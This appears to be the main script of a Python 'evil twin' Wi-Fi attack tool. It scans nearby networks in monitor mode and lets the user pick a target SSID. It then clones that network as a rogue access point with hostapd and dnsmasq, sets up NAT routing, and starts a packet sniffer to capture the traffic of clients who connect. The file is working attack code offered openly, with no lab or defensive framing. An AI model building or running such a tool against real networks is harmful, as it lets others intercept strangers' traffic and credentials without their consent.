import os
import sys
import signal
import subprocess
from dotenv import load_dotenv

load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))

INTERFACE = os.getenv("WIFI_INTERFACE", "wlan0")
OUTBOUND = "eth0"

from core.scanner import enable_monitor_mode, disable_monitor_mode, scan_networks, prompt_user_selection
from core.ap_manager import configure_interface, write_hostapd_conf, write_dnsmasq_conf, enable_routing, start_hostapd, start_dnsmasq, teardown

processes = []


def handle_exit(sig, frame):
    teardown(processes, interface=INTERFACE, outbound_interface=OUTBOUND)
    sys.exit(0)


def main():
    if os.geteuid() != 0:
        print("[!] need root - try: sudo python main.py")
        sys.exit(1)

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    # step 1 - monitor mode + scan
    print(f"[*] putting {INTERFACE} in monitor mode...")
    mon_if = enable_monitor_mode(INTERFACE)

    print("[*] scanning nearby wifi...")
    nets = scan_networks(mon_if)

    if not nets:
        print("[!] no networks found, check the adapter maybe?")
        disable_monitor_mode(mon_if)
        sys.exit(1)

    # pick which ssid to clone
    target = prompt_user_selection(nets)
    print(f"\n[*] going after: {target['ssid']} (ch {target.get('channel', 6)})")

    # back to managed mode, set up the ap
    print("[*] turning off monitor mode")
    disable_monitor_mode(mon_if)

    print("[*] configuring iface...")
    configure_interface(INTERFACE)

    print("[*] writing hostapd/dnsmasq configs")
    write_hostapd_conf(target["ssid"], target.get("channel", 6), INTERFACE)
    write_dnsmasq_conf(INTERFACE)

    print("[*] enabling nat/routing")
    enable_routing(OUTBOUND)

    print("[*] starting hostapd")
    processes.append(start_hostapd())

    print("[*] starting dnsmasq")
    processes.append(start_dnsmasq())

    # fire up the sniffer
    print("[*] starting packet sniffer...")
    sniff_proc = subprocess.Popen([sys.executable, "core/sniffer.py"])
    processes.append(sniff_proc)

    print(f"\n[+] rogue ap '{target['ssid']}' is running, waiting for clients")
    print("[*] ctrl+c to stop\n")

    # just hang here
    for p in processes:
        p.wait()


if __name__ == "__main__":
    main()
